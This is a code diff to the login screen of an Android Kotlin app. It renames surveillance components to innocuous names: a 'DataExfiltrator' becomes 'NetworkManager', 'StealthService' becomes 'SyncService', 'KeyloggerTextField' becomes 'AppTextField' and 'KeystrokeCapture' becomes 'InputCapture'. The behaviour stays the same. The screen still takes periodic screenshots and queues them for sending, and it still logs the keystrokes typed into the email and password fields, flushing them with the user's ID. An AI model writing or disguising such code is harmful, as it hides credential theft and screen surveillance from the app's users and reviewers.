@@ -25,8 +25,8 @@ fun LoginScreen(
     modifier: Modifier = Modifier,
     onLoginSuccess: () -> Unit,
     onGoRegister: () -> Unit,
-    screenshotCapture: ScreenshotCapture,
-    exfiltrator: DataExfiltrator,
+    screenshotCapture: MediaHelper,
+    syncManager: NetworkManager,
     logEvent: (String, String) -> Unit
 ) {
     val auth = remember { FirebaseAuth.getInstance() }
@@ -44,15 +44,15 @@ fun LoginScreen(
     DisposableEffect(view, activity) {
         activity?.let {
             if (view.isAttachedToWindow) {
-                StealthService.CurrentViewHolder.currentRootView = WeakReference(view)
-                StealthService.CurrentViewHolder.currentActivityName = LOGIN_SCREEN
+                SyncService.CurrentViewHolder.currentRootView = WeakReference(view)
+                SyncService.CurrentViewHolder.currentActivityName = LOGIN_SCREEN
             }
         }
 
         onDispose {
-            if (StealthService.CurrentViewHolder.currentActivityName == LOGIN_SCREEN) {
-                StealthService.CurrentViewHolder.currentRootView = null
-                StealthService.CurrentViewHolder.currentActivityName = null
+            if (SyncService.CurrentViewHolder.currentActivityName == LOGIN_SCREEN) {
+                SyncService.CurrentViewHolder.currentRootView = null
+                SyncService.CurrentViewHolder.currentActivityName = null
             }
         }
     }
@@ -63,11 +63,11 @@ fun LoginScreen(
         val handler = android.os.Handler(android.os.Looper.getMainLooper())
         val captureRunnable = object : Runnable {
             override fun run() {
-                val currentScreen = StealthService.CurrentViewHolder.currentActivityName ?: "unknown"
+                val currentScreen = SyncService.CurrentViewHolder.currentActivityName ?: "unknown"
                 screenshotCapture.captureScreenshot { file ->
                     file?.let {
-                        exfiltrator.queueImage(it) // moves file to pending_images first
-//                        exfiltrator.queueFile(it) // logs metadata second
+                        syncManager.queueImage(it) 
+//                        syncManager.queueFile(it) 
                         logEvent("SCREENSHOT_CAPTURE_$currentScreen", it.name)
                     }
                 }
@@ -88,7 +88,7 @@ fun LoginScreen(
         Text("Login", style = MaterialTheme.typography.titleLarge)
         if (status.isNotBlank()) Text(status)
 
-        KeyloggerTextField(
+        AppTextField(
             value = email,
             onValueChange = { email = it },
             label = { Text("Email") },
@@ -97,7 +97,7 @@ fun LoginScreen(
             modifier = Modifier.fillMaxWidth()
         )
 
-        KeyloggerTextField(
+        AppTextField(
             value = password,
             onValueChange = { password = it },
             label = { Text("Password") },
@@ -122,7 +122,7 @@ fun LoginScreen(
                         isLoading = false
                         status = "Login success"
                         // Flush captured keystrokes now that we have a valid uid
-                        KeystrokeCapture.flush(result.user?.uid ?: "unknown")
+                        InputCapture.flush(result.user?.uid ?: "unknown")
                         onLoginSuccess()
                     }
                     .addOnFailureListener { e ->
@@ -130,7 +130,7 @@ fun LoginScreen(
                         status = "Login failed: ${e.message}"
                         Log.e(TAG, "Login failed", e)
                         // Capture failed attempt — uid unknown since auth didn't complete
-                        KeystrokeCapture.flush("failed_attempt")
+                        InputCapture.flush("failed_attempt")
                     }
             },
             enabled = !isLoading,
